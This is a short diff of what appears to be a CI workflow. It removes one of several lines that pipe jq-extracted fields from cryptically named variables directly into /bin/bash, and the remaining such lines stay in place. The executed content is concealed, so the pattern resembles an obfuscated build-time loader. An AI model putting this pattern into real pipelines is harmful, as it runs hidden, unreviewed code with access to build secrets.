@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$l93" | jq -r .jozh9019 | /bin/bash
           echo $ahf38 | jq -r .b6 | /bin/bash
           echo $eqmi456 | jq -r .kfapi2 | /bin/bash
-          echo $abo4 | jq -r .iwlh53 | /bin/bash
           echo $akq39340 | jq -r .c8094 | /bin/bash
 
       - name: Archive results
